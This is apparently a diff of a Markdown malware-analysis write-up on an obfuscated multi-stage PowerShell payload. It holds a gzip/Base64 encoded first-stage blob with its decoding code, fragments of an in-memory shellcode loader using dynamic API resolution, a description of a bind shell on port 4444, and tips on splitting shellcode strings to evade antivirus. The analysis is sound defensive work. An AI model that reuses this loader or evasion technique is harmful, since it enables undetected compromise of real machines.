+$compressed = ((("H4sIAPtILWgCA7VXbW+bSBD+Xqn/AVWWjFXHL6mTpp" + "Ei3WJDjGsnJhjc2LVOGBbYeA0EFtuk1/9+sxjyojp3u{1}OKhMzuzszOPvPMzNpNA5uRMBAiSx{1}+vH8nFM/Yiq21IFbuBid1oWL9OUGntafVSnQjn62EC0GcoyjqhWuLBIv" + "z824axzhg+3HjEjOUJHi9pAQnYk34S5j6OM{1}H18s7bDPhh1D5s3FJw6VFC7Gsa9k+Fo5Q4PC1YWhb3LWGHlHCxOr379Xa/Ki9aMj3qUUTsapnCcPrhk" + "NptSb8rPENJ1mExeqI2HGYhC5rTEnw6bhhBInl4iuwtsEjzPzQSapwmqfzxJilcVAci9v{1}S4lV+BzHoY0cJ8{1}JUq0Lc77DfLH4Q5wX29+kASNr3FADhuMw0nG8IT{1}OGn0rcCi+we4CtHQWk8Bb1GogtglXWKwEKaV14b+YEa/wtgTvrUricyWQGrO4VoewHjroKHRSiveq1QOeci7U4HnkA"+"0D4k6Polh"+"zafJsd4NDTRPnM8xUMPovjMCG57oXQqgsj2NxiY{1}zBsDKJU1xbPCIuVOwoOAnrbzXXLnVBM7OXMDM3Q+IsnvRfUKBiXbpc5nU+97BLAtzLAmtN7JKy4qGoYJfiHJFGKXYF/onVYgE7PUyx{1}zEOMyfHL2rymrBHXSkl1MExsiGyCXgFQa+9dGYfObGqBiO8BvT2Y2BrxYVEwaV0kRx{1}uTsfg1C1S60kqQvjFDLVrgs6tih26gIKElIso{1}SF+Wf1yd1RShmxrYSV5ha1l2gWu3bDIGFxakNYAYGJ"+"HmGbWJQDUhf6xMFSphOv3L16EI6uRSmkD1jaQDhghsOgM06WGBzdE6PW0DFT1xHFaxDKK4dCLQ/qRJElOb0sDzv"+"Vw46WqbDnPQemROS{1}mxBtnYasLpgk{1}lCGOMjArv/nxK8FiHvTjXERHLHMsLmUM{1}4DlUS/VTlLC4xyRGIGaChxuJa"+"sBJ929qVG/NCUSe9k3Au3CB5{1}udFMSTfMmTpyBlRXmX4rk6Hh+yppqx6"+"MM0P2xqwVf{1}1M+gO910dxb+e7SE1UuS9lWltCdp98NgeSYYAe6Q61u52KnO7QUz3YQFJ9W2rNWp7UUrpDXfJl0kKervW1TnumNs+oRB50V"+"Uf96aP9R7typ9P/tpugq9EA+cq1o7SPlVx/xfVnq8thT87HNh9rt4lM{1}NhHVm4108dTM5KmsjLTzEj1Pm49zRw"+"2O4ov"+"wbxKdsPIbMLTbg82gfMwom"+"cPI3BXM2cDgmeqhzMPaQjptwHVl9sukhQb7fEyYG41UYOdtoxGTnbbb34xRwRHIdJkhBQKWblG1rbXbJuSxs8E"+"L9LHTaS"+"rQbf4lbRlf"+"N/70vRAVyW2cy+Dz2CTwNoJrHWPH5yAr0FMVOKCzdiNrsfgrtHabWVv11qRwUfj8tS53n7uuE2T68HbB5/ay1Xb57qerXsIzqQv/bvlVEOF/xrEWyV48M1sO1cjW7rvmVQyrodns8SRB4omIYNc3XS1250nhWBzDcuSs"+"dcbNM/4d9DM5OPB1sjgvTzF9rbpb8CHXl+H830l2xMp9Ui/PwUMlpstsw{1}TbXm/pstjJ/frTAvHaHbWDXufO31DSVv2xF5/uefYESdutrWLiw9A8LlBAvbpeFFxj9uWzvvA+3cVRzNGz3j+Wp8bWXHiWxT4D/2rrENKGCtFRxqHhGuIIr/drHAcYArXAbgwlOmLKA1t3hF564JmvG+RvGMbau7Voa+a8ChYe+qT5dT5+Qx8hILAc7UxxIHH/Hpr96nVggbX2rU6eeK//WTdMMrE3Fidt8gcmtI6za2"+"DQeIKovjb0YKrEIOS/Cper0EHO6+ggEJF31c1DqAUhvQ5fMW5HtnwHD2ArQ1Hn/Nb0J4mYOII3ws"+"Vxu8Iz+8cFSuJfytxiursw4/zL8R5mvuH1TeRqVXfw/PL9MuJ{1}33t"+"9wEw"+"tQgDQR2aDMX7i89BHIpceR{1}hCA0kgls8/A/BdcqOruB6mbe5vwFbNEquiwwAAA{0}{0}") -f"=","Z")))
 $bytes = [System.Convert]::FromBase64String($compressed)
 $stream = New-Object System.IO.MemoryStream(, $bytes)
 $gzip = New-Object System.IO.Compression.GzipStream($stream, [System.IO.Compression.CompressionMode]::Decompress)
@@ -165,14 +167,14 @@ Write-Output $script
 
 This "manual method" reveals the second-stage script, which is then analyzed for its shellcode execution capabilities.
 
-## Second-Stage Script: In-Memory Shellcode Execution
+### Second-Stage Script: In-Memory Shellcode Execution
 
 The deobfuscated second-stage script (`payload.ps1`) is designed to execute shellcode directly in memory, a common tactic to bypass file-based AV detection.
 
 Key features of this script:
 *   **Dynamic Function Resolution**: It avoids static analysis of imported functions by dynamically resolving critical Windows API functions (e.g., `VirtualAlloc`, `CreateThread`, `VirtualProtect`, `WaitForSingleObject`). This is done using reflection and custom functions like `paE` (likely for `GetProcAddress` via `GetModuleHandle`) and `vXZ` (for creating delegate types on the fly).
 *   **Dynamic Assembly Creation**: The script uses `DefineDynamicAssembly` and `DefineDynamicModule` to create .NET assemblies in memory. This allows it to define and use types, such as delegates for P/Invoke calls, without writing to disk.
-*   **Shellcode Handling**: The shellcode is stored as a Base64 encoded string within the script. It's decoded and copied into an executable memory region allocated by `VirtualAlloc`. `VirtualProtect` might be used to change memory permissions before execution.
+*   **Shellcode Handling**: The shellcode is stored as a Base64 encoded string within the script. It\'s decoded and copied into an executable memory region allocated by `VirtualAlloc`. `VirtualProtect` might be used to change memory permissions before execution.
 
 ```powershell
 function paE {
@@ -207,8 +209,9 @@ if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pa
 ```
 
 ![Second layer script analysis with shellcode loading](./assets/evasiondecrypttwo.png)
+*Analysis of the second-stage PowerShell script, showing shellcode loading and execution.*
 
-## Shellcode Analysis
+### Shellcode Analysis
 
 The final payload is the shellcode. Analysis of this shellcode reveals its purpose, which is typically to establish a command and control (C2) channel or deploy further malware.
 
@@ -250,7 +253,7 @@ The shellcode executes the following actions:
 
 In essence, this shellcode implements a bind shell: it listens on port 4444 and provides an interactive command prompt to any client that connects to it.
 
-## Further Evasion: Splitting the Payload
+### Further Evasion: Splitting the Payload
 
 To make signature-based detection more difficult, the Base64 encoded shellcode within the PowerShell script can be split into multiple string variables. These variables are then concatenated at runtime before the shellcode is decoded and executed.
 
@@ -288,7 +291,7 @@ if (([System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((pa
 }
 ```
 
-## Conclusion: Evasion Strategy
+### Conclusion: Evasion Strategy
 
 The PowerShell payload uses a sophisticated, multi-stage strategy to evade detection:
 1.  **Initial Obfuscation**: The attack starts with a Base64 encoded command, hiding the initial script from simple static analysis and casual inspection.
@@ -298,4 +301,4 @@ The PowerShell payload uses a sophisticated, multi-stage strategy to evade detec
     *   Dynamic API resolution and in-memory .NET assembly compilation make it harder for AV systems to detect malicious P/Invoke calls through static analysis of import tables.
 4.  **Shellcode Obfuscation**: Storing the shellcode as a Base64 string (and potentially splitting it across multiple variables) helps to hide it from basic signature-based detection methods.
 
-These combined techniques significantly improve the payload's ability to evade detection by traditional Antivirus solutions.
+These combined techniques significantly improve the payload\'s ability to evade detection by traditional Antivirus solutions.
